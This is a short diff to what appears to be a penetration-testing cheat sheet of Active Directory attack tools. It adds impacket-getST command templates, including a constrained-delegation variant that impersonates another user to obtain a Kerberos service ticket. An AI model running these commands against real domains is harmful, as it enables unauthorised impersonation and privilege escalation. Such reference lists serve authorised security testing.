@@ -110,6 +110,11 @@ certipy-ad auth -pfx 'FILENAME' -dc-ip 'IP' -u 'USERNAME' -d 'DOMAIN'
 ```
 - impacket-GetNPUsers ![GitHub Repo stars](https://img.shields.io/github/stars/fortra/impacket?style=social)
 - impacket-getST
+```sh
+impacket-getST -spn 'SPN' -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
+# KCD
+impacket-getST -spn 'SPN' -impersonate 'USERNAME' -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
+```
 - impacket-GetUserSPNs
 - kerbrute ![GitHub Repo stars](https://img.shields.io/github/stars/ropnop/kerbrute?style=social)
 - netexec
